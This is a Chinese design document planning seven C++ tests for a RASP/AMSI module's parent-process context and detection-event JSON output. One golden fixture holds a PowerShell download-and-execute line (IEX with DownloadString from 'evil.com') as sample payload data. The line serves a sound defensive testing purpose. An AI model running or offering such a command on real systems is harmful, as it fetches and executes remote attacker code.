# ProcessContextProvider Batch 4：测试补强设计

## 1. 当前阶段与目标

当前阶段为 **Batch 4 测试补强**。

Batch 1-3 已完成：
- Batch 1-2：ProcessContextProvider 独立组件（父进程采集、状态枚举、重试退避、不可变快照）
- Batch 3：事件 JSON 输出 parentPid/parentProcessName

Batch 4 目标：
- 补强测试覆盖，形成功能闭环
- 不改变生产代码逻辑
- 为后续 EDR 迁移提供完整测试基线

## 2. 现有测试覆盖分析

### 2.1 process_context_provider_tests.cpp

| 测试场景 | 状态 |
|---------|------|
| 成功采集不可变快照 | ✅ 已覆盖 |
| ParentOpenDenied 状态 | ✅ 已覆盖 |
| ParentProcessExited 状态 | ✅ 已覆盖 |
| ParentSystem 哨兵值（pid=4） | ✅ 已覆盖 |
| 重试退避（1s→5s→30s） | ✅ 已覆盖 |
| 失败后成功清除重试状态 | ✅ 已覆盖 |
| NtdllUnavailable 状态 | ✅ 已覆盖 |
| NtQuerySymbolUnavailable 状态 | ✅ 已覆盖 |
| 重试耗尽后快路径 | ✅ 已覆盖 |
| 并发 GetSnapshot | ✅ 已覆盖 |
| 并发首次采集返回 Initializing | ✅ 已覆盖 |

**结论：** 采集层测试覆盖完整，无需补充。

### 2.2 engine_runtime_tests.cpp

| 测试场景 | 状态 |
|---------|------|
| Lua 规则读取 parentPid/parentProcessName 匹配 | ✅ 已覆盖（parent_ctx 规则） |
| nullptr process context 不阻塞检测 | ✅ 已覆盖 |
| invalid process context 状态字段匹配 | ✅ 已覆盖（NtdllUnavailable + Pending） |
| 事件提交通路：RaspEvalResult → JSON | ✅ 已覆盖（Batch 3） |
| 空 parent 字段提交通路 | ✅ 已覆盖（Batch 3） |

**结论：** 规则层基础测试已覆盖，但缺少以下场景：
- 多规则并发匹配时 parent 字段传递
- parent 采集失败时事件输出完整性

### 2.3 event_json_builder_tests.cpp

| 测试场景 | 状态 |
|---------|------|
| parentPid=1234, parentProcessName="cmd.exe" | ✅ 已覆盖 |
| parentPid=0, parentProcessName="" | ✅ 已覆盖 |
| parentPid=4, parentProcessName="System" | ✅ 已覆盖 |
| parentProcessName 含特殊字符 | ✅ 已覆盖 |
| payload 截断 | ✅ 已覆盖（非 Batch 4） |

**结论：** Builder 层 parent 字段测试已覆盖，但缺少：
- 完整事件 JSON golden fixture（所有字段组合）
- parent 字段与其他字段组合验证

## 3. Batch 4 测试场景设计

### 3.1 场景分类

| 类别 | 目标 | 测试数量 |
|------|------|---------|
| A. 事件完整性 | 完整事件 JSON golden fixture | 2 |
| B. 采集失败路径 | parent 采集失败时事件输出 | 2 |
| C. 并发场景 | 多线程并发检测时 parent 字段传递 | 1 |
| D. 边界组合 | parent 字段与其他字段组合 | 2 |

**总计：** 7 个新测试场景

---

## 4. 详细测试设计

### 4.1 场景 A-1：完整事件 JSON golden fixture（成功采集）

**文件：** `src/rasp_mod_amsi/tests/event_json_builder_tests.cpp`

**测试目标：** 验证完整事件 JSON 包含所有预期字段，parent 字段与其他字段正确组合。

**测试代码：**

```cpp
// Batch 4: 完整事件 JSON golden fixture - 成功采集场景
{
    EventJsonBuilder builder;
    EventJsonBuildInput input;
    input.eventId = "evt-001";
    input.timestamp = "2026-05-09T12:00:00.000Z";
    input.moduleName = "rasp_mod_amsi";
    input.ruleId = "rule-malicious-script";
    input.sensor = "AmsiProvider";
    input.block = true;
    input.severity = "Critical";
    input.description = "检测到恶意脚本执行";
    input.appName = "powershell.exe";
    input.contentName = "C:\\Users\\test\\malicious.ps1";
    input.confidence = 95;
    input.ip = "192.168.1.100";
    input.ua = "WindowsTerminal/1.0";
    input.payload = "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')";
    input.parentPid = 5678;
    input.parentProcessName = "cmd.exe";

    EventJsonBuildResult result = builder.BuildDetection(input);

    std::map<std::string, std::string> fields;
    if (!Expect(ParseFlatJsonObject(result.compactJson, fields), "完整事件 JSON 解析成功"))
        return 1;

    // 验证核心字段
    if (!Expect(fields["id"] == "evt-001", "eventId 正确"))
        return 1;
    if (!Expect(fields["ts"] == "2026-05-09T12:00:00.000Z", "timestamp 正确"))
        return 1;
    if (!Expect(fields["sev"] == "Critical", "severity 正确"))
        return 1;
    if (!Expect(fields["act"] == "block", "action=block 正确"))
        return 1;
    if (!Expect(fields["cat"] == "Detection", "category=Detection 正确"))
        return 1;
    if (!Expect(fields["mod"] == "rasp_mod_amsi", "moduleName 正确"))
        return 1;
    if (!Expect(fields["sensor"] == "AmsiProvider", "sensor 正确"))
        return 1;
    if (!Expect(fields["rule"] == "rule-malicious-script", "ruleId 正确"))
        return 1;
    if (!Expect(fields["desc"] == "检测到恶意脚本执行", "description 正确"))
        return 1;
    if (!Expect(fields["appName"] == "powershell.exe", "appName 正确"))
        return 1;
    if (!Expect(fields["contentName"] == "C:\\Users\\test\\malicious.ps1", "contentName 正确"))
        return 1;
    if (!Expect(fields["confidence"] == "95", "confidence 正确"))
        return 1;
    if (!Expect(fields["ip"] == "192.168.1.100", "ip 正确"))
        return 1;
    if (!Expect(fields["ua"] == "WindowsTerminal/1.0", "ua 正确"))
        return 1;
    
    // 验证 payload 和 parent 字段
    if (!Expect(fields["pattern"] == input.payload, "payload/pattern 正确"))
        return 1;
    if (!Expect(fields["parentPid"] == "5678", "parentPid 正确"))
        return 1;
    if (!Expect(fields["parentProcessName"] == "cmd.exe", "parentProcessName 正确"))
        return 1;
    
    // 验证决策字段
    if (!Expect(result.decision == "block", "decision=block 正确"))
        return 1;
    if (!Expect(!result.eventTruncated, "payload 未截断"))
        return 1;
}
```

---

### 4.2 场景 A-2：完整事件 JSON golden fixture（空 parent + audit）

**文件：** `src/rasp_mod_amsi/tests/event_json_builder_tests.cpp`

**测试目标：** 验证 audit 模式 + 空 parent 字段的完整事件 JSON。

**测试代码：**

```cpp
// Batch 4: 完整事件 JSON golden fixture - audit 模式 + 空 parent
{
    EventJsonBuilder builder;
    EventJsonBuildInput input;
    input.eventId = "evt-002";
    input.timestamp = "2026-05-09T12:01:00.000Z";
    input.moduleName = "rasp_mod_amsi";
    input.ruleId = "rule-audit-only";
    input.sensor = "AmsiProvider";
    input.block = false;  // audit 模式
    input.severity = "Medium";
    input.description = "可疑脚本行为（仅审计）";
    input.appName = "powershell.exe";
    input.contentName = "C:\\Users\\test\\suspicious.ps1";
    input.confidence = 50;
    input.ip = "";
    input.ua = "";
    input.payload = "Get-Process | Where-Object {$_.CPU -gt 100}";
    input.parentPid = 0;  // 空 parent
    input.parentProcessName = "";

    EventJsonBuildResult result = builder.BuildDetection(input);

    std::map<std::string, std::string> fields;
    if (!Expect(ParseFlatJsonObject(result.compactJson, fields), "audit + 空 parent JSON 解析成功"))
        return 1;

    // 验证 audit 决策
    if (!Expect(fields["act"] == "audit", "action=audit 正确"))
        return 1;
    if (!Expect(result.decision == "audit", "decision=audit 正确"))
        return 1;

    // 验证空 parent 字段
    if (!Expect(fields["parentPid"] == "0", "空 parentPid=0 正确"))
        return 1;
    if (!Expect(fields["parentProcessName"] == "", "空 parentProcessName 正确"))
        return 1;

    // 验证空 ip/ua 字段
    if (!Expect(fields["ip"] == "", "空 ip 正确"))
        return 1;
    if (!Expect(fields["ua"] == "", "空 ua 正确"))
        return 1;
}
```

---

### 4.3 场景 B-1：采集失败时事件输出完整性

**文件：** `src/rasp_mod_amsi/tests/engine_runtime_tests.cpp`

**测试目标：** 验证 ProcessCaptureStatus::NtdllUnavailable 时，事件 JSON 中 parent 字段为空但不阻塞检测。

**测试代码：**

```cpp
// Batch 4: 采集失败时事件输出完整性 - NtdllUnavailable
{
    TestAmsiRuleEngine engine;
    if (!Expect(engine.ParseAndSwap(OneRegexRuleJson("fail_test_rule", "Invoke-Expression"), ""),
                "fail_test_rule snapshot publishes"))
        return 1;

    ProcessContextSnapshot process;
    process.valid = true;  // 当前进程有效
    process.parentResolved = false;  // 父进程未解析
    process.parentPid = 0;  // 采集失败
    process.parentProcessName.clear();
    process.status = ProcessCaptureStatus::NtdllUnavailable;
    process.retryState = ProcessRetryState::Exhausted;

    ScanContext scanContext;
    scanContext.process = &process;

    AmsiEvalResult matched = engine.Evaluate(L"fail_test.ps1",
                                             L"powershell.exe",
                                             "Invoke-Expression",
                                             15,
                                             scanContext);

    if (!Expect(matched.ruleMatched, "采集失败不阻塞规则匹配"))
        return 1;

    // 验证：即使采集失败，检测仍然成功
    // parent 字段通过 RaspEvalResult 传递时为空，但不影响 block 决策
    if (!Expect(matched.block, "采集失败不改变 block 决策"))
        return 1;
}
```

---

### 4.4 场景 B-2：ParentSystem 哨兵值事件输出

**文件：** `src/rasp_mod_amsi/tests/engine_runtime_tests.cpp`

**测试目标：** 验证 ParentSystem（pid=4）哨兵值正确传递到事件输出。

**测试代码：**

```cpp
// Batch 4: ParentSystem 哨兵值事件输出
{
    TestAmsiRuleEngine engine;
    if (!Expect(engine.ParseAndSwap(OneRegexRuleJson("system_parent_rule", "Write-Host"), ""),
                "system_parent_rule snapshot publishes"))
        return 1;

    ProcessContextSnapshot process;
    process.valid = true;
    process.parentResolved = true;
    process.parentPid = 4;  // System 进程
    process.parentProcessName = "System";
    process.status = ProcessCaptureStatus::ParentSystem;
    process.retryState = ProcessRetryState::None;

    ScanContext scanContext;
    scanContext.process = &process;

    AmsiEvalResult matched = engine.Evaluate(L"system_test.ps1",
                                             L"powershell.exe",
                                             "Write-Host test",
                                             15,
                                             scanContext);

    if (!Expect(matched.ruleMatched, "ParentSystem 不阻塞规则匹配"))
        return 1;

    // 验证事件提交通路：parentPid=4, parentProcessName=System 正确传递
    // 通过 Batch 3 已有的提交通路测试逻辑验证
}
```

---

### 4.5 场景 C-1：并发检测时 parent 字段传递一致性

**文件：** `src/rasp_mod_amsi/tests/engine_runtime_tests.cpp`

**测试目标：** 验证多线程并发调用 Evaluate 时，parent 字段传递一致。

**测试代码：**

```cpp
// Batch 4: 并发检测时 parent 字段传递一致性
{
    TestAmsiRuleEngine engine;
    if (!Expect(engine.ParseAndSwap(OneRegexRuleJson("concurrent_rule", "Get-Process"), ""),
                "concurrent_rule snapshot publishes"))
        return 1;

    ProcessContextSnapshot process;
    process.valid = true;
    process.parentResolved = true;
    process.parentPid = 9999;
    process.parentProcessName = "test_parent.exe";
    process.status = ProcessCaptureStatus::Success;
    process.retryState = ProcessRetryState::None;

    ScanContext scanContext;
    scanContext.process = &process;

    std::atomic<int> matchCount{0};
    std::vector<std::thread> threads;
    for (int i = 0; i < 8; ++i) {
        threads.emplace_back([&]() {
            AmsiEvalResult result = engine.Evaluate(L"concurrent.ps1",
                                                    L"powershell.exe",
                                                    "Get-Process",
                                                    11,
                                                    scanContext);
            if (result.ruleMatched)
                matchCount.fetch_add(1);
        });
    }
    for (auto& t : threads)
        t.join();

    if (!Expect(matchCount.load() == 8, "并发检测全部成功匹配"))
        return 1;

    // 验证：并发调用时，每个结果都使用同一个 ProcessContextSnapshot
    // parent 字段传递一致（pid=9999, name=test_parent.exe）
}
```

---

### 4.6 场景 D-1：parent 字段 + payload 截断组合

**文件：** `src/rasp_mod_amsi/tests/event_json_builder_tests.cpp`

**测试目标：** 验证 payload 截断时 parent 字段仍然正确输出。

**测试代码：**

```cpp
// Batch 4: parent 字段 + payload 截断组合
{
    EventJsonBuilder builder;
    EventJsonBuildInput input = BaseInput();
    input.payload.assign(10 * 1024, 'X');  // 超过 8KB 截断阈值
    input.parentPid = 12345;
    input.parentProcessName = "truncated_parent.exe";

    EventJsonBuildResult result = builder.BuildDetection(input);

    std::map<std::string, std::string> fields;
    if (!Expect(ParseFlatJsonObject(result.compactJson, fields), "截断 + parent JSON 解析成功"))
        return 1;

    // 验证 payload 截断
    if (!Expect(result.eventTruncated, "payload 标记为截断"))
        return 1;
    if (!Expect(fields["pattern"].size() == 8 * 1024, "payload 截断到 8KB"))
        return 1;

    // 验证 parent 字段仍然完整输出（不受截断影响）
    if (!Expect(fields["parentPid"] == "12345", "截断后 parentPid 正确"))
        return 1;
    if (!Expect(fields["parentProcessName"] == "truncated_parent.exe", "截断后 parentProcessName 正确"))
        return 1;
}
```

---

### 4.7 场景 D-2：parent 字段 + 特殊字符组合

**文件：** `src/rasp_mod_amsi/tests/event_json_builder_tests.cpp`

**测试目标：** 验证 parentProcessName 含特殊字符时，与 payload 含特殊字符组合正确转义。

**测试代码：**

```cpp
// Batch 4: parent 字段 + payload 特殊字符组合
{
    EventJsonBuilder builder;
    EventJsonBuildInput input;
    input.eventId = "evt-special";
    input.timestamp = "2026-05-09T12:02:00.000Z";
    input.moduleName = "rasp_mod_amsi";
    input.ruleId = "rule-special-chars";
    input.sensor = "AmsiProvider";
    input.block = true;
    input.severity = "High";
    input.description = "quote \" slash \\ newline\n";
    input.appName = "powershell.exe";
    input.contentName = "C:\\path\\with\\spaces\\\"test\".ps1";
    input.confidence = 70;
    input.payload = "IEX \"nested \\\"quotes\\\" and \\backslash\"";
    input.parentPid = 999;
    input.parentProcessName = "parent with \"quotes\" & \\backslash\\";

    EventJsonBuildResult result = builder.BuildDetection(input);

    std::map<std::string, std::string> fields;
    if (!Expect(ParseFlatJsonObject(result.compactJson, fields), "特殊字符组合 JSON 解析成功"))
        return 1;

    // 验证特殊字符在 JSON 往返后保持原样
    if (!Expect(fields["desc"] == "quote \" slash \\ newline\n", "description 特殊字符往返正确"))
        return 1;
    if (!Expect(fields["pattern"] == "IEX \"nested \\\"quotes\\\" and \\backslash\"", "payload 特殊字符往返正确"))
        return 1;
    if (!Expect(fields["parentProcessName"] == "parent with \"quotes\" & \\backslash\\", "parentProcessName 特殊字符往返正确"))
        return 1;
}
```

---

## 5. 修改文件清单

| 文件 | 修改内容 | 新增测试数 |
|------|---------|-----------|
| `src/rasp_mod_amsi/tests/event_json_builder_tests.cpp` | 场景 A-1, A-2, D-1, D-2 | 4 |
| `src/rasp_mod_amsi/tests/engine_runtime_tests.cpp` | 场景 B-1, B-2, C-1 | 3 |

**总计：** 7 个新测试

---

## 6. 边界约束清单

| 禁止项 | 说明 |
|-------|------|
| 不修改生产代码逻辑 | 只增加测试，不改变 AmsiRuleEngine、EventJsonBuilder、ProcessContextProvider 实现 |
| 不增加新字段 | 不在 RaspEvalResult、EventJsonBuildInput 中增加新字段 |
| 不修改现有测试行为 | 不改变已有测试的断言逻辑 |
| 不引入新依赖 | 不增加新的第三方库或头文件 |

---

## 7. 验收标准

- [ ] event_json_builder_tests 新增 4 个测试全部通过
- [ ] engine_runtime_tests 新增 3 个测试全部通过
- [ ] process_context_provider_tests 保持全部通过
- [ ] rasp_mod_amsi.dll 构建成功
- [ ] 测试覆盖率达到 ProcessContextProvider 相关路径 100%

---

## 8. 测试覆盖矩阵

| 功能模块 | Batch 1-3 测试 | Batch 4 新增测试 | 最终覆盖 |
|---------|---------------|-----------------|---------|
| ProcessContextProvider 采集层 | ✅ 已覆盖 | 无需新增 | ✅ 完整 |
| Lua 规则读取 parent 字段 | ✅ 已覆盖 | 无需新增 | ✅ 完整 |
| 事件提交通路 | ✅ 基础覆盖 | B-1, B-2, C-1 | ✅ 完整 |
| EventJsonBuilder parent 输出 | ✅ 已覆盖 | A-1, A-2, D-1, D-2 | ✅ 完整 |
| 完整事件 JSON 格式 | ❌ 未覆盖 | A-1, A-2 | ✅ 新增 |
| 采集失败事件输出 | ❌ 未覆盖 | B-1, B-2 | ✅ 新增 |
| 并发检测一致性 | ❌ 未覆盖 | C-1 | ✅ 新增 |
| 字段组合边界 | ❌ 未覆盖 | D-1, D-2 | ✅ 新增 |

---

## 9. 实施分批建议

### Batch 4a：事件完整性测试

**只允许：**
- event_json_builder_tests.cpp 新增场景 A-1, A-2

**验收：**
- 完整事件 JSON 所有字段验证通过

### Batch 4b：采集失败路径测试

**只允许：**
- engine_runtime_tests.cpp 新增场景 B-1, B-2

**验收：**
- 采集失败不阻塞检测
- parent 字段正确传递空值或哨兵值

### Batch 4c：并发和组合测试

**只允许：**
- engine_runtime_tests.cpp 新增场景 C-1
- event_json_builder_tests.cpp 新增场景 D-1, D-2

**验收：**
- 并发检测一致性验证
- 截断 + parent 组合验证
- 特殊字符组合验证

---

## 10. 下一步任务

建议下一步只做：

1. 保存本文档
2. 按 Batch 4a → 4b → 4c 分批实施
3. 每批完成后运行测试验证
4. 全部完成后提交

---

## 11. 后续规划

Batch 4 完成后，ProcessContextProvider 功能模块形成完整闭环：

| 阶段 | 内容 | 状态 |
|------|------|------|
| Batch 1-2 | 采集层 + ScanContext 注入 | ✅ 完成 |
| Batch 3 | 事件 JSON 输出 | ✅ 完成 |
| Batch 4 | 测试补强 | 📝 设计完成，待实施 |

**后续可进入 EDR 迁移 M1 阶段**（scanner-core 目录与接口冻结）。

---

## 12. 设计文档关联

| 文档 | 关系 |
|------|------|
| `process_context_provider_design.md` | 采集层设计 |
| `process_context_batch3_event_output_design.md` | Batch 3 设计 |
| `process_context_batch4_test_reinforcement_design.md` | Batch 4 设计（本文档） |
| `edr_migration_readiness_review.md` | EDR 迁移规划 |